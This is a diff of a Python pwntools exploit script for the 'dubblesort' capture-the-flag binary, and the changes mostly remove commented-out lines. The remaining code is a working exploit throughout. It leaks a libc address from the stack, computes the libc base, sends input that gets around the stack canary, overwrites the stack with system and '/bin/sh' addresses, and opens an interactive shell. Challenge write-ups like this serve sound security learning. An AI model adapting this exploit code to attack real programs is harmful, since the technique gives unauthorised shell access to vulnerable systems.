@@ -1,18 +1,11 @@
 from pwn import *
 
 
-#libc = ELF('/lib32/libc-2.27.so')
 libc = ELF('./libc-2.27.so')
-#libc = ELF('./libc_32.so.6')
 elf = ELF('./dubblesort')
 
 context(terminal=['tmux', 'new-window'])
-
-#context(os = 'linux', arch = 'x86_64')
 context.log_level = 'DEBUG'
-#context.aslr = 'False'
-
-#context.arch = 'i386'
 
 value = "alksjdalkdj"
 
@@ -67,22 +60,13 @@ def stackattack_debug():
     p.sendline(str(base + bin_shell))
     p.recvuntil(":")
     p.sendline(str(base + bin_shell))
-    #p.recvuntil(":")
-    #p.sendline(str(base + bin_shell))
     p.interactive()
-    #p.recvline()
-    #p.recvline()
-    #blah = p.recvuntil("4294956988 ")
-    #print('blah :: ' + blah)
-    #p.wait_for_close()
 
 def stackattack(canary):
     p.recvuntil(":")
     p.sendline("54")
     
     p.recvuntil(":")
-    #p.sendline(canary  + '\x00')
-    #p.sendline(str(u32('\x00' + canary)))
     p.sendline(p32(u32('\x00' + canary)))
     print('canary :: ' + str(u32('\x00' + canary)))
 
@@ -90,24 +74,16 @@ def stackattack(canary):
         p.recvuntil(":")
         print('send :: ' + str(u32('\x00' + canary) + x))
 	p.sendline(p32(u32('\x00' + canary) + x))
-        #p.sendline(str(x))
 
     p.recvuntil(":")
     p.sendline(str(canary))
     
     for x in range(12, 54):
         p.recvuntil(":")
-	#p.sendline(str(u32(canary + '\x00') + x))
 	p.sendline("1")
-    #p.sendline("asdadasdas")
-    #for x in range(5):
-    #    p.recvuntil(":")
-    #	p.sendline(str(u32(canary + '\x00') + x))
     p.recvline()
     p.recvline()
     blah = p.recvuntil("4294956988 ")
-    #blah = p.recvuntil("*** stack smashing detected ***")
-    #blah = p.recvuntil("3")
     print('blah :: ' + blah)
     p.wait_for_close()
 
@@ -116,7 +92,6 @@ def stackprint():
     p.sendline("50")
 
     p.recvuntil(":")
-    #p.sendline("lakjd")
     p.sendline("llkasjdlajdalksjdalksdjlkajsdllkasjdlaksakjdakldjalajdslasjdlkasdajsdajsldjkdlkjadlkjalkdjasldjasldjalsdjalsdkj")
 
 
@@ -124,11 +99,9 @@ def stackprint():
     print(blah)
     p.recvline() 
     blah = p.recv(1000) 
-    #blah = p.recvuntil("*** stack smashing detected ***")
     output_array = blah.split(" ")
     for i in range(len(output_array)):
             print(str(i) + " " + output_array[i])
-    #blah = p.recvline()
 
 
 def stackleak(value):
@@ -143,12 +116,8 @@ def stackleak(value):
     print(str(hex(stack_leak)))
     print(str(hex(stack_leak_2)))
     return stack_leak
-    #print(str(hex(u32(p.recv(4)))))
-    #p.recvuntil("\n")
 
 libc_leak = stackleak(value)
-#1761860
-#base = libc_leak-196681
 base = libc_leak-1761860
 print('base :: ' + hex(base))
 
